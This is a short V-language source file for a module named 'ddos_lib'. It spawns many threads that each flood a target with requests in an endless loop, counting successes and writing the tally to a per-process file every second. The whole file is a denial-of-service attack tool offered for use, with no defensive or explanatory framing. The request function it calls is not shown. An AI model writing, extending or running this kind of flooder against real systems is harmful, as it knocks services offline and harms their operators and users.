module ddos_lib

import time { sleep }
import os

fn dos(target string, req_count &int) {
	mut success := false

    for {
        success = ddos_lib.request(target)
		if success {
			unsafe { *req_count += 1 }
		}
    }
}

pub fn ddos(threads_num int, target string) {
	mut threads := []thread{}
	mut req_count := 0
	pid := os.getpid()

    for _ in 0..threads_num {
    	threads << spawn dos(target, &req_count)
    }

	for {
		os.write_file('pids/${pid}.txt', req_count.str()) or {}
		sleep(1 * time.second)
	}
}
